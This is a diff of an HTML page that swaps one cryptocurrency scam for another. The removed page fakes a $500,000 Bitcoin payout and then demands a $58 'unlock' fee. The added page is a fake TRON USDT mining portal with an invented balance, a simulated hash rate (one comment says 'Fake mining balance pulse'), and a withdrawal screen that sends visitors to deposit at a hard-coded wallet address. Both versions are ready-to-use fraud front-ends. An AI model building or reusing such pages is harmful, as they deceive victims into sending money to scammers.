@@ -3,297 +3,216 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FME Iceland • Secure Funding</title>
+    <title>TRON USDT • Mining Portal</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&amp;family=Space+Grotesk:wght@500;600&amp;display=swap');
         
-        :root {
-            --primary: #00ff9d;
+        body { font-family: 'Inter', system-ui, sans-serif; }
+        .logo-font { font-family: 'Space Grotesk', sans-serif; }
+
+        .mining-rig {
+            animation: miningPulse 4s ease-in-out infinite;
         }
-        
-        body {
-            font-family: 'Inter', system-ui, sans-serif;
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
-            color: white;
-            overflow: hidden;
+        @keyframes miningPulse {
+            0%, 100% { opacity: 0.85; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.03); }
         }
-        
-        .hero-bg {
-            background: radial-gradient(circle at center, rgba(0, 255, 157, 0.08) 0%, transparent 70%);
-        }
-        
-        .btc-coin {
-            animation: btcFloat 3s ease-in-out infinite;
-        }
-        
-        @keyframes btcFloat {
-            0%, 100% { transform: translateY(0) rotate(0deg); }
-            50% { transform: translateY(-20px) rotate(8deg); }
-        }
-        
-        .incoming {
-            animation: incomingAnim 2.5s forwards;
-        }
-        
-        @keyframes incomingAnim {
-            0% { opacity: 0; transform: translateY(100px) scale(0.6); }
-            100% { opacity: 1; transform: translateY(0) scale(1); }
-        }
-        
-        .modal {
-            animation: modalPop 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
-        }
-        
-        @keyframes modalPop {
-            0% { transform: scale(0.6); opacity: 0; }
-            100% { transform: scale(1); opacity: 1; }
-        }
-        
-        .scan-line {
-            position: absolute;
-            height: 3px;
-            width: 100%;
-            background: linear-gradient(90deg, transparent, #00ff9d, transparent);
-            box-shadow: 0 0 20px #00ff9d;
-            animation: scan 4s linear infinite;
+
+        .hash-rate {
+            font-variant-numeric: tabular-nums;
         }
     </style>
 </head>
-<body class="min-h-screen flex items-center justify-center">
-    <!-- Welcome Overlay -->
-    <div id="welcome-overlay" class="fixed inset-0 bg-black/95 flex items-center justify-center z-50 transition-opacity duration-1000">
-        <div class="text-center">
-            <div class="flex justify-center mb-6">
-                <div class="w-24 h-24 bg-gradient-to-br from-emerald-400 to-cyan-400 rounded-2xl flex items-center justify-center text-5xl shadow-2xl">
-                    🇮🇸
-                </div>
-            </div>
-            <h1 class="text-6xl font-bold tracking-tighter mb-3">FME ICELAND</h1>
-            <p class="text-3xl text-emerald-400 font-medium">Welcome Back</p>
-            <div class="mt-8 w-48 h-1 bg-emerald-500 mx-auto rounded-full"></div>
-        </div>
-    </div>
+<body class="bg-zinc-950 text-white overflow-x-hidden">
 
-    <div class="max-w-2xl w-full mx-auto p-6 relative z-10">
-        <!-- Header -->
-        <div class="flex items-center justify-between mb-12">
-            <div class="flex items-center gap-3">
-                <div class="w-10 h-10 bg-emerald-500 rounded-xl flex items-center justify-center text-2xl">🇮🇸</div>
-                <div>
-                    <h1 class="text-3xl font-bold tracking-tight">FME Secure Funding</h1>
-                    <p class="text-emerald-400 text-sm">Blockchain Transaction • Iceland</p>
-                </div>
-            </div>
-            <div class="text-right">
-                <div class="text-sm text-gray-400">Transaction Value</div>
-                <div class="text-3xl font-mono font-semibold text-emerald-400">$500,000</div>
-                <div class="text-xl font-mono text-gray-300">7.8 BTC</div>
-            </div>
-        </div>
-
-        <!-- BTC Animation Container -->
-        <div id="animation-container" class="hidden mb-12">
-            <div class="relative h-52 bg-zinc-950 border border-emerald-900/50 rounded-3xl flex items-center justify-center overflow-hidden">
-                <!-- Background grid -->
-                <div class="absolute inset-0 bg-[linear-gradient(to_right,#222_1px,transparent_1px),linear-gradient(to_bottom,#222_1px,transparent_1px)] bg-[size:40px_40px] opacity-30"></div>
-                
-                <!-- Bitcoin Icon -->
-                <div id="btc-main" class="text-8xl incoming btc-coin">₿</div>
-                
-                <!-- Particles -->
-                <div id="particles" class="absolute inset-0"></div>
-                
-                <div class="scan-line top-1/3"></div>
-                
-                <div class="absolute bottom-6 left-1/2 -translate-x-1/2 text-xs font-mono tracking-widest text-emerald-500 flex items-center gap-2">
-                    <div class="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></div>
-                    INCOMING TRANSACTION
-                </div>
-            </div>
-        </div>
-
-        <!-- Confirmation Section -->
-        <div id="confirmation-section" class="hidden bg-zinc-900/70 backdrop-blur-xl border border-emerald-900/50 rounded-3xl p-8">
-            <div class="flex items-start gap-4 mb-8">
-                <i class="fa-solid fa-circle-info text-4xl text-emerald-400 mt-1"></i>
-                <div>
-                    <h2 class="text-2xl font-semibold mb-1">Confirm Transaction Details</h2>
-                    <p class="text-gray-400">Please verify the information below</p>
-                </div>
+    <!-- NAVBAR -->
+    <nav class="bg-black border-b border-zinc-800 sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto px-8 py-5 flex justify-between items-center">
+            <div class="flex items-center gap-x-4">
+                <div class="w-10 h-10 bg-gradient-to-br from-cyan-400 to-blue-500 rounded-2xl flex items-center justify-center text-3xl font-bold">⛏️</div>
+                <div class="text-3xl font-semibold tracking-tighter logo-font text-cyan-400">TRON<span class="text-white">MINER</span></div>
             </div>
             
-            <div class="space-y-6">
-                <!-- Recipient -->
-                <div class="flex justify-between items-center bg-zinc-950 rounded-2xl p-5 border border-zinc-800">
+            <div class="flex items-center gap-x-8 text-sm">
+                <div onclick="showDashboard()" class="cursor-pointer hover:text-cyan-400 transition-colors">Dashboard</div>
+                <div onclick="showMining()" class="cursor-pointer hover:text-cyan-400 transition-colors">Mining</div>
+                <div onclick="showDeposit()" class="cursor-pointer hover:text-cyan-400 transition-colors">Deposit</div>
+                <div onclick="showWithdraw()" class="cursor-pointer hover:text-cyan-400 transition-colors">Withdraw</div>
+            </div>
+
+            <div class="flex items-center gap-x-3 bg-zinc-900 px-5 py-3 rounded-3xl">
+                <div class="text-xs text-right">
+                    <div class="text-emerald-400">Connected</div>
+                    <div class="font-mono text-[13px]">TRC20</div>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- DASHBOARD -->
+    <div id="dashboard" class="max-w-7xl mx-auto px-8 py-12">
+        <div class="grid md:grid-cols-2 gap-8">
+            <!-- Main Balance -->
+            <div class="bg-zinc-900 rounded-3xl p-10">
+                <div class="flex justify-between">
                     <div>
-                        <div class="text-sm text-gray-400">Recipient</div>
-                        <div class="font-medium text-lg">Mr. Finnur Sturluson</div>
+                        <div class="uppercase text-xs tracking-widest text-zinc-400">Main Balance</div>
+                        <div class="text-6xl font-semibold tracking-tighter mt-4 text-white">$0.00</div>
+                        <div class="text-emerald-400 text-sm mt-1">USDT</div>
                     </div>
-                    <div class="text-emerald-400">
-                        <i class="fa-solid fa-check-circle text-3xl"></i>
-                    </div>
+                    <i class="fa-solid fa-wallet text-5xl text-zinc-700"></i>
                 </div>
-                
-                <!-- Type -->
-                <div class="flex justify-between items-center bg-zinc-950 rounded-2xl p-5 border border-zinc-800">
+            </div>
+
+            <!-- Mining Balance -->
+            <div class="bg-gradient-to-br from-zinc-900 to-cyan-950 border border-cyan-400/30 rounded-3xl p-10">
+                <div class="flex justify-between">
                     <div>
-                        <div class="text-sm text-gray-400">Transaction Type</div>
-                        <div class="font-medium text-lg">FME Secure Funding</div>
+                        <div class="uppercase text-xs tracking-widest text-cyan-400">Mining Balance</div>
+                        <div id="mining-balance" class="text-6xl font-semibold tracking-tighter mt-4 text-cyan-400">$245,000</div>
+                        <div class="text-cyan-400/70 text-sm mt-1">USDT • Active</div>
                     </div>
-                    <div class="px-4 py-1 bg-emerald-900/50 text-emerald-400 text-sm font-medium rounded-full">SECURE</div>
-                </div>
-                
-                <!-- Amount -->
-                <div class="bg-gradient-to-r from-emerald-900/30 to-transparent border border-emerald-800 rounded-3xl p-6">
-                    <div class="text-sm text-gray-400 mb-1">Amount</div>
-                    <div class="flex items-baseline gap-3">
-                        <span class="text-5xl font-mono font-bold text-white">7.8</span>
-                        <span class="text-4xl font-medium text-emerald-400">BTC</span>
+                    <div class="text-right">
+                        <div class="text-4xl">⛏️</div>
                     </div>
-                    <div class="text-2xl font-medium text-gray-400">$500,000 USD</div>
                 </div>
             </div>
-            
-            <!-- Wallet Input -->
-            <div class="mt-10">
-                <label class="block text-sm text-gray-400 mb-3 font-medium">YOUR BTC WALLET ADDRESS</label>
-                <div class="relative">
-                    <input id="wallet-input" 
-                           type="text" 
-                           placeholder="bc1qxy2kdy... (your receiving address)"
-                           class="w-full bg-zinc-950 border border-zinc-700 focus:border-emerald-500 focus:outline-none rounded-2xl px-6 py-5 font-mono text-sm">
-                    <button onclick="saveWallet()" 
-                            id="save-btn"
-                            class="absolute right-2 top-1/2 -translate-y-1/2 bg-emerald-500 hover:bg-emerald-600 transition-colors text-black font-semibold px-8 py-3 rounded-xl flex items-center gap-2">
-                        <span>SAVE</span>
-                        <i class="fa-solid fa-arrow-right"></i>
-                    </button>
-                </div>
-                <p class="text-xs text-gray-500 mt-3">This is where the funds will be sent after verification.</p>
+        </div>
+
+        <!-- Quick Stats -->
+        <div class="grid grid-cols-3 gap-6 mt-10">
+            <div class="bg-zinc-900 rounded-3xl p-6 text-center">
+                <div class="text-xs text-zinc-400">24h Earnings</div>
+                <div class="text-3xl font-semibold text-emerald-400 mt-3">1,284 USDT</div>
+            </div>
+            <div class="bg-zinc-900 rounded-3xl p-6 text-center">
+                <div class="text-xs text-zinc-400">Hash Rate</div>
+                <div id="hash-rate" class="hash-rate text-3xl font-semibold text-white mt-3">487.3 TH/s</div>
+            </div>
+            <div class="bg-zinc-900 rounded-3xl p-6 text-center">
+                <div class="text-xs text-zinc-400">Active Miners</div>
+                <div class="text-3xl font-semibold text-white mt-3">12</div>
             </div>
         </div>
     </div>
 
-    <!-- Loading Overlay -->
-    <div id="loading-overlay" class="hidden fixed inset-0 bg-black/90 backdrop-blur-md flex items-center justify-center z-[100]">
+    <!-- MINING SECTION -->
+    <div id="mining-section" class="hidden max-w-7xl mx-auto px-8 py-12">
         <div class="text-center">
-            <div class="w-20 h-20 border-4 border-zinc-700 border-t-emerald-400 rounded-full animate-spin mx-auto mb-8"></div>
-            <h3 class="text-2xl font-semibold mb-2">Processing Transaction</h3>
-            <p class="text-gray-400 max-w-xs">Confirming on Bitcoin Network • ETA 11 seconds</p>
-            
-            <div class="mt-12 w-72 h-1.5 bg-zinc-800 rounded-full overflow-hidden">
-                <div id="progress-bar" class="h-full bg-gradient-to-r from-emerald-400 to-cyan-400 w-0 transition-all duration-11000"></div>
+            <div class="mining-rig inline-flex flex-col items-center">
+                <div class="text-8xl mb-6">⛏️</div>
+                <div class="text-2xl font-medium text-cyan-400">TRON USDT MINING ACTIVE</div>
+                <div class="mt-8 w-64 h-2 bg-zinc-800 rounded-full overflow-hidden">
+                    <div class="h-full bg-gradient-to-r from-cyan-400 to-blue-500 w-[87%] rounded-full"></div>
+                </div>
             </div>
         </div>
     </div>
 
-    <!-- Success Modal -->
-    <div id="success-modal" class="hidden fixed inset-0 bg-black/80 flex items-center justify-center z-[200]">
-        <div class="modal bg-zinc-900 border border-emerald-500/30 rounded-3xl max-w-md w-full mx-4 p-8 text-center">
-            <div class="w-20 h-20 mx-auto bg-emerald-500/10 rounded-2xl flex items-center justify-center text-5xl mb-6">🎉</div>
-            
-            <h2 class="text-3xl font-bold mb-2">Transaction Confirmed</h2>
-            <p class="text-emerald-400 mb-8">7.8 BTC • $500,000 has been successfully processed</p>
-            
-            <div class="bg-zinc-950 rounded-2xl p-5 text-left mb-8 font-mono text-sm">
-                <div class="flex justify-between py-2 border-b border-zinc-800">
-                    <span class="text-gray-400">TXID</span>
-                    <span class="text-emerald-400">LOCKED ACCESS $58 NEEDED</span>
+    <!-- DEPOSIT SECTION -->
+    <div id="deposit-section" class="hidden max-w-4xl mx-auto px-8 py-16">
+        <div class="bg-zinc-900 rounded-3xl p-12">
+            <h2 class="text-3xl font-semibold text-center">Investment Deposit</h2>
+            <div class="mt-10 text-center">
+                <div class="text-sm text-zinc-400">Send USDT (TRC20) to this wallet:</div>
+                <div onclick="copyWallet()" class="mt-4 font-mono bg-black p-6 rounded-2xl text-cyan-300 text-sm break-all cursor-pointer hover:text-cyan-400 transition-colors">
+                    TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o
                 </div>
-                <div class="flex justify-between py-2 border-b border-zinc-800">
-                    <span class="text-gray-400">To</span>
-                    <span>Mr. Finnur Sturluson</span>
-                </div>
-                <div class="flex justify-between py-2">
-                    <span class="text-gray-400">Status</span>
-                    <span class="text-emerald-400 font-medium">✓ Confirmed on-chain</span>
-                </div>
+                <div class="mt-6 text-xs text-zinc-500">Minimum deposit: $100 USDT</div>
             </div>
-            
-            <button onclick="closeModal()" 
-                    class="w-full bg-white text-black py-4 rounded-2xl font-semibold hover:bg-gray-200 transition-colors">
-                RETURN TO DASHBOARD
+        </div>
+    </div>
+
+    <!-- WITHDRAW SECTION -->
+    <div id="withdraw-section" class="hidden max-w-4xl mx-auto px-8 py-16">
+        <div class="bg-zinc-900 rounded-3xl p-12 text-center">
+            <i class="fa-solid fa-circle-exclamation text-6xl text-amber-400"></i>
+            <h2 class="text-3xl font-semibold mt-8">Withdrawal Unavailable</h2>
+            <p class="mt-4 text-zinc-400 max-w-md mx-auto">
+                You don’t have any investment package. Please deposit the minimum amount and try again.
+            </p>
+            <button onclick="showDeposit()" 
+                    class="mt-10 px-10 py-5 bg-cyan-500 text-black font-semibold rounded-3xl">
+                Make a Deposit
             </button>
         </div>
     </div>
 
+    <!-- FLOATING WALLET -->
+    <div class="fixed bottom-8 right-8 bg-zinc-900 border border-cyan-400/30 rounded-3xl px-6 py-4 flex items-center gap-x-3 text-sm cursor-pointer hover:border-cyan-400 transition-colors" onclick="showDeposit()">
+        <i class="fa-solid fa-wallet text-cyan-400"></i>
+        <span class="font-mono text-xs">TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o</span>
+    </div>
+
     <script>
-        // Tailwind script already included via CDN
-        
-        // Step 1: Welcome screen
-        setTimeout(() => {
-            const welcome = document.getElementById('welcome-overlay');
-            welcome.style.opacity = '0';
-            
-            setTimeout(() => {
-                welcome.classList.add('hidden');
-                
-                // Show animation container
-                document.getElementById('animation-container').classList.remove('hidden');
-                
-                // Create floating BTC particles
-                createParticles();
-            }, 1000);
-        }, 4000);
-        
-        // Step 2: Show confirmation after animation (total ~6s from start)
-        setTimeout(() => {
-            document.getElementById('confirmation-section').classList.remove('hidden');
-        }, 6500);
-        
-        function createParticles() {
-            const container = document.getElementById('particles');
-            for (let i = 0; i < 25; i++) {
-                const particle = document.createElement('div');
-                particle.className = 'absolute text-3xl opacity-30';
-                particle.innerHTML = '₿';
-                particle.style.left = Math.random() * 100 + '%';
-                particle.style.top = Math.random() * 100 + '%';
-                particle.style.animation = `btcFloat ${2 + Math.random() * 3}s linear infinite`;
-                particle.style.animationDelay = `-${Math.random() * 3}s`;
-                container.appendChild(particle);
-            }
+        let currentSection = 'dashboard';
+
+        function hideAll() {
+            document.getElementById('dashboard').classList.add('hidden');
+            document.getElementById('mining-section').classList.add('hidden');
+            document.getElementById('deposit-section').classList.add('hidden');
+            document.getElementById('withdraw-section').classList.add('hidden');
         }
-        
-        function saveWallet() {
-            const input = document.getElementById('wallet-input');
-            if (!input.value.trim()) {
-                input.classList.add('!border-red-500');
-                setTimeout(() => input.classList.remove('!border-red-500'), 2000);
-                return;
-            }
-            
-            // Start loading
-            document.getElementById('loading-overlay').classList.remove('hidden');
-            
-            // Progress bar animation
-            const progress = document.getElementById('progress-bar');
-            progress.style.width = '100%';
-            
-            // Show modal after 11 seconds
-            setTimeout(() => {
-                document.getElementById('loading-overlay').classList.add('hidden');
-                document.getElementById('success-modal').classList.remove('hidden');
-            }, 11000);
+
+        function showDashboard() {
+            hideAll();
+            document.getElementById('dashboard').classList.remove('hidden');
+            currentSection = 'dashboard';
         }
-        
-        function closeModal() {
-            document.getElementById('success-modal').classList.add('hidden');
-            // Optional: reset form or redirect
-            alert("Thank you! Transaction Will be Paid once the $58 has been deposited.");
+
+        function showMining() {
+            hideAll();
+            document.getElementById('mining-section').classList.remove('hidden');
+            currentSection = 'mining';
         }
-        
-        // Allow Enter key on input
-        document.getElementById('wallet-input').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                saveWallet();
-            }
-        });
-        
-        // Keyboard shortcut hint
-        console.log('%cFME Iceland Secure Portal ready. Press Enter after pasting wallet address.', 'color: #00ff9d; font-family: monospace');
+
+        function showDeposit() {
+            hideAll();
+            document.getElementById('deposit-section').classList.remove('hidden');
+            currentSection = 'deposit';
+        }
+
+        function showWithdraw() {
+            hideAll();
+            document.getElementById('withdraw-section').classList.remove('hidden');
+            currentSection = 'withdraw';
+        }
+
+        function copyWallet() {
+            navigator.clipboard.writeText("TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o");
+            const toast = document.createElement('div');
+            toast.className = "fixed bottom-24 right-8 bg-emerald-600 text-white px-6 py-3 rounded-2xl text-sm";
+            toast.textContent = "Wallet address copied!";
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 2000);
+        }
+
+        // Live Hash Rate Animation
+        function animateHashRate() {
+            let rate = 487.3;
+            setInterval(() => {
+                rate += (Math.random() * 1.2 - 0.6);
+                document.getElementById('hash-rate').textContent = rate.toFixed(1) + " TH/s";
+            }, 1800);
+        }
+
+        // Initialize
+        window.onload = () => {
+            showDashboard();
+            animateHashRate();
+            
+            // Fake mining balance pulse
+            setInterval(() => {
+                const el = document.getElementById('mining-balance');
+                el.style.transition = 'all 0.6s';
+                el.style.transform = 'scale(1.05)';
+                setTimeout(() => {
+                    el.style.transform = 'scale(1)';
+                }, 600);
+            }, 4000);
+        };
     </script>
 </body>
 </html>
